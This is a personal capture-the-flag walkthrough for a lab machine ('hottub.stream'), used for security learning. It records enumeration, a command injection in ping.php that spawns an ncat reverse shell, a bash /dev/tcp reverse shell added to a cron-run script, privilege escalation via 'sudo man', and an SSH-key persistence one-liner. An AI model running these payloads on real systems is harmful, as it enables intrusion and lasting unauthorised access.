##### [Captain Cruch video writeup]([[https]]://www.youtube.com/watch?v=8yzs1ehicRk)

##### Ryan's pdf writeup ![[CRUNCHS_CTF.pdf]]

### [[nmap]]
visit 192.168.246.132 --> apache/Ubuntu "Default" page

scan 192.168.246.132 for open ports - ports 22 and 80 are open
```shell
$ nmap 192.168.246.132
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-06 07:39 EST
Nmap scan report for admin.hottub.stream (192.168.246.132)
Host is up (0.0014s latency)
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
Nmap done: 1 IP address (1 host up) scanned in 0.14 seconds
```
	
visit 192.168.246.132:22 --> restricted
visit 192.168.246.132:22 --> apache/Ubuntu  "Default" page

### Gobuster - for subdirectory discovery 
use gobuster to scan for directories on 192.168.246.132
```shell
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -o gobuster.log -u 192.168.246.132
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.246.132
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/06 08:31:51 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 280]
/.hta                 (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 10918]
/notes                (Status: 301) [Size: 318] [--> http://192.168.246.132/notes/]
/server-status        (Status: 403) [Size: 280]                                             
===============================================================
2022/03/06 08:31:52 Finished
===============================================================
```
Forbidden - .htaccess, .hta, .htapasswd, server-status
only available - notes at 192.168.246.132/notes/notes.txt
```
TODO:
1. Fix James his permissions
2. DON'T FORGET: eat enough ice cream!
3. Block the admin subdomain from outsiders
4. Run linpeas!

DONE:
1. Add a blacklist to the ping function! We now filter: |, &, ;, { ,}
2. Let Ryan get covid															:(
3. Hottub stream
4. Host hottub.stream on our server.
5. Install linpeas in /dev/shm to defend our machine against attackers!
```
### Assumptions based on notes
James is a user on the system
James permissions are not correct
admin subdomain is accessible to riff raff
ping function exists on server
hottub.stream exists on server
Ryan has covid

attempts to access 192.168.246.132 with any subdomains at this point were unsuccessful

attempt to access 192.168.246.132/hottub.stream was unsucessful -
![[Pasted image 20220319082409.png]]


#### modifing the local /etc/hosts
according to the notes the server is hosting hottub.stream
/etc/hosts file asigns domain names to ip addresses locally
added 192.168.246.132 admin.hottub.stream
```
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.105    horizontall.htb
192.168.246.132 hottub.stream admin.hottub.stream
```

now the server 192.168.246.132 sees that I'm accessing it under a different name --> providing a completely different website

calling page admin.hottub.stream produces 
	Jame's php admin page
	
now that we have a new webpage available we can run gobuster on it
```shell
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u admin.hottub.stream -x htm,html,php

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://admin.hottub.stream
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,htm,html
[+] Timeout:                 10s
===============================================================
2022/03/06 16:06:39 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 122]
/ping.php             (Status: 200) [Size: 140]
/server-status        (Status: 403) [Size: 284]
                                               
===============================================================
2022/03/06 16:09:53 Finished
===============================================================
```

reveals a ping.php page
however notes state - ping function filters: |, &, ;, { ,}

#### 1st Rev shell #1
```bash
nc -lvnp 4444
```
burpsuite proxy to intercept ping web utilty traffic.
	then repeater to send back ncat reverse shell
	ip=1.1.1.1
	ip= ncat -e /bin/sh 192.168.246.131 4444

#### 1st Rev shell #2
```bash
nc -lvnp 4444
```
command injection in http://admin.hottub.stream/ping.php
IP: 1.1.1.1 $(ncat -e /bin/bash 192.168.246.131 4444)

cat /etc/passwd | grep sh
	searches /etc/passwd and greps users with baSH
```bash
www-data@vicim:/var$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
james:x:1000:1000:victim:/home/james:/bin/bash
debug:x:1001:1001:,,,:/home/debug:/bin/bash
```

from notes.php - run linpeas
searched crunches box - no linpeas

on kali attack box - download linpeas
```bashc
wget https://github.com/carlospolop/PEASS-ng/releases/download/20220313/linpeas.sh
```
then spin up python server 
```bash
python3 -m http.server
```
then on the victim box - pull linpeas from my kali attack box 
```bash
cd /tmp
wget http://192.168.246.131:8000/linpeas.sh
```
make linpeas.sh executable then run it
```bash
chmod 777 linpeas.sh
./linpeas.sh
```

linpeas shows the following file as vulnerable
james /opt/tools/linpeas-updater.sh
cronfile located in etc/crontab
runs every minute, hour,day
```bash
www-data@vicim:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * * james /opt/tools/linpeas-updater.sh
```

so if we can R,W,X linpeas-updater.sh
and it runs every minute
we could add a bash reverse shell to it 
but 1st start another nc listener on another port 
attacking pc
```bash 
nc -lvnp 4445
```

on victim box reverse shell from ping, burp, ncat reverse shell add to linpeas-updater.sh
```bash
bash -i >& /dev/tcp/attacking.ip/port 0>&1
```

```bash
james@vicim:/etc$ sudo -l
Matching Defaults entries for james on vicim:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on vicim:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/man

```

consult [GTFOBins](https://gtfobins.github.io/gtfobins/man/) to search for man exploit
```bash
ames@vicim:/etc$ sudo man man
james@vicim:/etc$ !/bin/sh
```

should be in root now
```bash
cat root.txt | base64 -d
```






if they don't already have key files in ~/.ssh, here's a good one liner
```bash
ssh-keygen -t rsa -f ~/.ssh/id_rsa_hacked -P "" && cat ~/.ssh/[id_rsa_hacked.pub](https://id_rsa_hacked.pub/) >> ~/.ssh/authorized_keys && cat ~/.ssh/id_rsa_hacked
```
it generates you a new [[SSH]] key, makes it authorized to use for the account, then reads the private key file that you copy the contents of locally












